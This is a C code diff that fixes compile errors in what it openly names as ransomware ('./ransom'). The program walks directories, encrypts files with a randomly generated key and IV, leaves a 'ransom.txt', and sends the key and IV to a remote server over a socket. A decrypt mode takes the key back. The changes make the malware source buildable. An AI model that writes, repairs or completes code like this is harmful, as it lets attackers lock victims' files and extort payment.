@@ -66,7 +66,7 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
     {
         while ((dir = readdir(d)) != NULL) {
             char* dirname;
-            strcpy(nameRep,rep->d_name);
+            strcpy(dirname,dir->d_name);
 
             if( strcmp( dir->d_name, "." ) == 0 || strcmp( dir->d_name, ".." ) == 0 ){
                 continue;
@@ -87,7 +87,7 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
                 //Encrypt
                 if (de_flag == 0){
                     if(is_encrypted(filename) == 0){
-                        continue
+                        continue;
                     }
                     else if(strcmp(filename,"ransom.txt")!=0){
                         encrypt(key,iv,filename);
@@ -103,7 +103,6 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
         }
         closedir(d);
     }
-    return 0;
 }
 
 int isFile(const char* name){
@@ -123,10 +122,10 @@ int isFile(const char* name){
 
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){
     if(RAND_bytes(key, sizeKey) == 0) {
-        test(key,sizeKey);
+        OPENSSL_cleanse(key,sizeKey);
     }
     if(RAND_bytes(iv, sizeIv) == 0) {
-        test(iv, sizeIv);
+        OPENSSL_cleanse(iv,sizeIv);
     }
     bytes_to_hexa(key, pKey, sizeKey);
     bytes_to_hexa(iv, pIv, sizeIv);
@@ -143,7 +142,7 @@ int send_key(char *pKey, char *pIv)
 
     sockid = socket(AF_INET,SOCK_STREAM,0);
 
-    struct sockaddr_in server_addr,
+    struct sockaddr_in server_addr;
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(server_port);
     server_addr.sin_addr.s_addr = inet_addr(server_ip);
@@ -168,6 +167,9 @@ int send_key(char *pKey, char *pIv)
 
 int main (int argc, char * argv[])
 {
+    unsigned char *key, *iv;
+    char *pKey, *pIv;
+
     //Binaire
     key = (unsigned char*)calloc(SIZEKEY+1,sizeof(unsigned char));
     iv = (unsigned char*)calloc(SIZEIV+1,sizeof(unsigned char));
@@ -189,7 +191,7 @@ int main (int argc, char * argv[])
                 listdir(argv[2],iv,key,0);
             }
         }
-        else if (!strcmp(argv[1],"-d") {
+        else if (!strcmp(argv[1],"-d")) {
             if (argc != 5) {
                 printf("Do something more like ./ransom -d <path> <key> <vector>\n");
                 return 0;
